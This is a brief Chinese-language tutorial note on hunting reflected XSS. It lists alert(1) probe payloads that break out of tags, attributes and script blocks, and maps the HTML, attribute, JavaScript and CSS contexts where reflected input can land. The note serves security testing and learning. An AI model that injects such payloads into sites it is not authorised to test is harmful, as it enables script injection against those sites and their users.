###反射型XSS挖掘
例如URL : http://www.foo.com/path/f.php?id=1&type=cool#new
分为http、www.foo.com、/path/f.php、id=1&type=cool、neww。
主要着手点是path部分：/path/f.php和query部分：id1&type=cool

####测试是否有xss点：

html中，例如URL：http://www.foo.com/xss.php?id=1

    <script>alert(1)</script>
    '"><script>alert(1)</script>
    <img/ src=@ onerror=alert(1)>
    '"><img/ src=@ onerror=alert(1)>
    
    ' onmouseover=alert(1) x='
    " onmouseover=alert(1) x="
    ` onmouseover=alert(1) x=`
    
    javascript:alert(1)//
    '";alert(1)//
    </script><script>alert(1)//
    ...
    
####URL的这个输入点是id=1，则输出点可能为：
HTML标签之间，`<div id="body">[输出]</div>`
> 截断:`</title><script>alert(1)</script>`

HTML标签之内，`<input type="text" value="[输出]">`
> 在src/href/action属性内，`<a href="[输出]">click me</a>`
在on*时间内，`<a href="#" onclick="[输出]">click me</a>`
在style属性，`<a href="#" style="[输出]">click me</a>`


javascript代码值，`<script>a="[输出]";...</script>`
> `</script><script>alert(1)//`


CSS代码值，`<style>body{font-size；[输出];...}</style>`